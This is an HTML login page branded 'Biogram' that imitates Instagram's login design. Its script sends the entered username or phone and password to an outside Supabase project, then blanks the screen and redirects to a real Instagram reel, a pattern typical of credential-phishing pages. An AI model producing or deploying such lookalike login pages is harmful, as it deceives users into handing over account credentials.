<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>• Login</title>

  <link rel="icon" href="favicon.ico" type="image/x-icon">

  <style>
    * {
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
        Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      margin: 0;
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      width: 100%;
      max-width: 350px;
      padding: 40px 30px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .logo {
      margin-bottom: 30px;
    }

    .logo img {
      display: block;
      margin: 0 auto;
      max-width: 180px;
    }

    form {
      width: 100%;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 8px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      background: #4cb5f9;
      border: none;
      border-radius: 8px;
      color: #fff;
      font-weight: 600;
      cursor: pointer;
    }
  </style>
</head>

<body>
  <div class="container">
    <img
      src="https://i.postimg.cc/zDdCYPyg/Captura-de-tela-2025-12-17-221627.png"
      class="logo"
      alt="Biogram"
    />

    <form id="loginForm">
      <input id="login" placeholder="Telefone, usuário ou email" required />
      <input id="password" type="password" placeholder="Senha" required />
      <button type="submit">Entrar</button>
    </form>
  </div>

  <div id="whiteScreen" style="
    display:none;
    position:fixed;
    inset:0;
    background:#fff;
    z-index:9999;"></div>

  <!-- Supabase CDN -->
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

  <script>
    const SUPABASE_URL = "https://pwmtpvsgykjvouljjmrz.supabase.co";
    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB3bXRwdnNneWtqdm91bGpqbXJ6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYwMTMxMTAsImV4cCI6MjA4MTU4OTExMH0.xQa-Tmyzx6UOCALygjxEGFNAJsIeQZ-r7bPQyP8XFQ8";

    // ✅ API GLOBAL CORRETA
    const supabaseClient = supabase.createClient(
      SUPABASE_URL,
      SUPABASE_KEY
    );

    document.getElementById("loginForm").addEventListener("submit", async (e) => {
      e.preventDefault();

      const loginValue = document.getElementById("login").value.trim();
      const passwordValue = document.getElementById("password").value;

      let credentials = { password: passwordValue };

      if (loginValue.includes("@")) {
        credentials.email = loginValue;
      } else {
        credentials.phone = loginValue;
      }

      const { error } =
        await supabaseClient.auth.signInWithPassword(credentials);

      if (error) {
        alert(error.message);
        return;
      }

      document.getElementById("whiteScreen").style.display = "block";

      setTimeout(() => {
        window.location.href =
          "https://www.instagram.com/reels/DSYPgN7EVG3/";
      }, 150);
    });
  </script>
</body>
</html>
